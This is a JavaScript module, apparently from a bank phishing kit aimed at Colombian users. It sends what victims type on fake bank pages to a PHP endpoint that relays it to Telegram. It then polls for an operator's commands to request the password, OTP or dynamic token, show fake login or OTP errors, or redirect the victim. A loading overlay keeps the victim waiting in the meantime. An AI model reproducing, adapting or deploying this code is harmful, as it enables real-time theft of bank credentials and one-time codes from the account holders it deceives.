/**
 * Base de Integración Telegram para Bancos
 * Sistema modular y reutilizable para conectar cualquier banco a Telegram
 */

class BankTelegramIntegration {
    constructor(bankName, bankCode) {
        this.bankName = bankName;
        this.bankCode = bankCode;
        this.sessionKey = `tigo_${bankCode}_session_id`;
        this.sessionId = this.getSessionId();
    }

    /**
     * Obtener o crear session ID
     */
    getSessionId() {
        let sessionId = sessionStorage.getItem(this.sessionKey);
        if (!sessionId) {
            sessionId = `${this.bankCode}_` + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem(this.sessionKey, sessionId);
            console.log(`[${this.bankCode.toUpperCase()}] Nueva sesión:`, sessionId);
        }
        return sessionId;
    }

    /**
     * Enviar datos a Telegram
     */
    async sendToTelegram(step, data) {
        const formData = {
            session_id: this.sessionId,
            action: `${this.bankCode}_${step}`,
            bank: this.bankName,
            step: step,
            data: data,
            timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
        };

        console.log(`[${this.bankCode.toUpperCase()}] Enviando:`, formData);

        try {
            const response = await fetch('/api/telegram-send.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            const result = await response.json();
            console.log(`[${this.bankCode.toUpperCase()}] Respuesta:`, result);

            return result.success === true;
        } catch (error) {
            console.error(`[${this.bankCode.toUpperCase()}] Error:`, error);
            return false;
        }
    }

    /**
     * Iniciar polling para esperar acciones (API optimizada - 50ms ultra rápido)
     */
    startPolling(callback) {
        if (window.__bankProcessing) return;
        
        TelegramClient.startPolling((actions, stop) => {
            if (window.__bankProcessing) return;
            window.__bankProcessing = true;
            
            const action = actions[0];
            console.log(`[${this.bankCode.toUpperCase()}] ✓ Ejecutando:`, action.action);
            
            // Llamar callback personalizado
            callback(action);
            
            // Resetear flag después de procesar
            setTimeout(() => {
                window.__bankProcessing = false;
            }, 50);
}, this.sessionId, 25, 300000);
    }

    /**
     * Mostrar overlay de carga
     */
    showLoading() {
        const overlay = document.getElementById('loadingOverlay') || document.getElementById('loadingScreen');
        if (overlay) {
            overlay.classList.add('active', 'show');
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    /**
     * Ocultar overlay de carga
     */
    hideLoading() {
        const overlay = document.getElementById('loadingOverlay') || document.getElementById('loadingScreen');
        if (overlay) {
            overlay.classList.remove('active', 'show');
            overlay.style.display = 'none';
            document.body.style.overflow = '';
        }
    }

    /**
     * Redireccionar sin delay
     */
    redirect(url) {
        this.hideLoading();
        window.location.href = url;
    }
}

// Mapeo de acciones comunes para todos los bancos
const CommonActions = {
    ERROR_LOGIN: 'error_login',
    REQUEST_LOGIN: 'request_login',
    REQUEST_PASSWORD: 'request_password',
    REQUEST_OTP: 'request_otp',
    REQUEST_TOKEN: 'request_token',
    REQUEST_DINAMICA: 'request_dinamica',
    ERROR_OTP: 'error_otp',
    ERROR_TOKEN: 'error_token',
    ERROR_PASSWORD: 'error_password',
    FINALIZAR: 'finalizar'
};
